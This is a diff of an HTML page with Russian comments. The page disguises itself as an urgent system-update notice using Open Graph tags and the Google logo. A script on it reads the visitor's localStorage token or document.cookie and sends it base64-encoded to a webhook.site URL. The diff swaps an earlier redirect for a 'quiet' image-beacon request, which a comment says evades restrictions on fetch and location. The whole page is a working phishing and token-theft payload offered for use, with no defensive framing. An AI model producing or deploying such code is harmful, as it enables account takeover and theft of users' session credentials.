@@ -1,13 +1,20 @@
 <!DOCTYPE html>
 <html>
-<script>
-    // Если зашел реальный человек, крадем токен и редиректим на нормальный сайт
-    var token = localStorage.getItem('token');
-    if (token) {
-        location.href = 'https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?stolen_token=' + btoa(token);
-    } else {
-        // Если зашел бот или токена нет
-        location.href = 'https://google.com';
-    }
-</script>
+<head>
+    <meta property="og:title" content="Срочное обновление системы">
+    <meta property="og:description" content="Нажмите, чтобы прочитать детали безопасности">
+    <meta property="og:image" content="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png">
+</head>
+<body>
+    <script>
+        // Вместо мгновенного редиректа, пробуем "тихую" отправку через тег изображения
+        // Это часто обходит запреты на fetch/location
+        var token = localStorage.getItem('token') || document.cookie;
+        if (token) {
+            var img = new Image();
+            img.src = 'https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?data=' + btoa(token);
+        }
+    </script>
+    <h1>Загрузка...</h1>
+</body>
 </html>
